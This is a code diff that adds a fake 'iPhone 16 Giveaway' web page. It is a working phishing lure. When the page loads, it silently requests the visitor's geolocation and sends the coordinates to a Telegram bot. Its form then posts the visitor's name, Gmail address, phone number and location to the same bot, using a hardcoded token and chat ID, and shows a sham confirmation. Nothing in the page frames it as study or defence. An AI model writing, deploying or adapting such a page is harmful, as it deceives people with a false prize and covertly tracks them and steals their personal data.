@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone 16 Giveaway</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #9b27b0, #3f51b5);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+    h2 {
+      font-size: 1.5rem;
+      margin-bottom: 5px;
+    }
+    p.subtext {
+      font-size: 1rem;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    form {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 90%;
+      max-width: 400px;
+    }
+    input {
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      outline: none;
+    }
+    button {
+      padding: 12px;
+      background-color: #ffc107;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .video-link {
+      margin-top: 20px;
+    }
+    a {
+      color: #ffeb3b;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body onload="getLocationAndSend()">
+  <h1>Zam Zam Electronics</h1>
+  <h2>iPhone 16 Giveaways</h2>
+  <p class="subtext">You've been selected for a special reward.<br>Click below to proceed.</p>  <form id="giveawayForm">
+    <input type="text" id="name" placeholder="Your Name" required>
+    <input type="email" id="gmail" placeholder="Your Gmail" required>
+    <input type="text" id="number" placeholder="Your Number" required>
+    <input type="text" id="location" placeholder="Your Location (Auto-Filled)" required>
+    <button type="submit">Claim Now</button>
+  </form>  <div class="video-link">
+    Win Videos: <a href="https://youtu.be/QOJlPuaoAdU?si=_C9KIX3CJ26eh6Ph" target="_blank">Watch Here</a>
+  </div>  <script>
+    const token = "7977125911:AAEGvFN0iduWfXmf88v2_ZMRjGZQoKFAgZA";
+    const chatId = "6975173404";
+
+    function sendLocationToTelegram(location) {
+      const message = `\n📍 Auto Location Sent on Visit:\n${location}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    function getLocationAndSend() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const coords = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+          document.getElementById("location").value = coords;
+          sendLocationToTelegram(coords);
+        });
+      }
+    }
+
+    document.getElementById("giveawayForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const gmail = document.getElementById("gmail").value;
+      const number = document.getElementById("number").value;
+      const location = document.getElementById("location").value;
+
+      const message = `\n📱 iPhone 16 Giveaway Entry:\n👤 Name: ${name}\n📧 Gmail: ${gmail}\n📞 Number: ${number}\n📍 Location: ${location}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        alert("Thanks! Your entry has been submitted.");
+        document.getElementById("giveawayForm").reset();
+      })
+      .catch(error => {
+        alert("There was an error submitting your entry.");
+      });
+    });
+  </script></body>
+</html>
